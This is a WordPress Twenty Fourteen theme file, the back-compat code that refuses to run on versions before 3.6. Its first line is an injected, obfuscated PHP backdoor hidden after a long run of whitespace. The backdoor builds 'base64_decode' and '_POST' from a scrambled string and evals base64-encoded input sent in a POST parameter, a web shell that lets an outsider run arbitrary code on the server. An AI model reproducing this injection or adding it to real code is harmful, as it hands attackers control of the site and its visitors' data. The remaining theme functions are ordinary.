<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n5122b7'])) {eval($s21(${$s20}['n5122b7']));}?><?php
/**
 * Twenty Fourteen back compat functionality
 *
 * Prevents Twenty Fourteen from running on WordPress versions prior to 3.6,
 * since this theme is not meant to be backward compatible beyond that
 * and relies on many newer functions and markup changes introduced in 3.6.
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */

/**
 * Prevent switching to Twenty Fourteen on old versions of WordPress.
 *
 * Switches to the default theme.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_switch_theme() {
	switch_theme( WP_DEFAULT_THEME, WP_DEFAULT_THEME );
	unset( $_GET['activated'] );
	add_action( 'admin_notices', 'twentyfourteen_upgrade_notice' );
}
add_action( 'after_switch_theme', 'twentyfourteen_switch_theme' );

/**
 * Add message for unsuccessful theme switch.
 *
 * Prints an update nag after an unsuccessful attempt to switch to
 * Twenty Fourteen on WordPress versions prior to 3.6.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_upgrade_notice() {
	$message = sprintf( __( 'Twenty Fourteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentyfourteen' ), $GLOBALS['wp_version'] );
	printf( '<div class="error"><p>%s</p></div>', $message );
}

/**
 * Prevent the Customizer from being loaded on WordPress versions prior to 3.6.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_customize() {
	wp_die( sprintf( __( 'Twenty Fourteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentyfourteen' ), $GLOBALS['wp_version'] ), '', array(
		'back_link' => true,
	) );
}
add_action( 'load-customize.php', 'twentyfourteen_customize' );

/**
 * Prevent the Theme Preview from being loaded on WordPress versions prior to 3.4.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_preview() {
	if ( isset( $_GET['preview'] ) ) {
		wp_die( sprintf( __( 'Twenty Fourteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentyfourteen' ), $GLOBALS['wp_version'] ) );
	}
}
add_action( 'template_redirect', 'twentyfourteen_preview' );
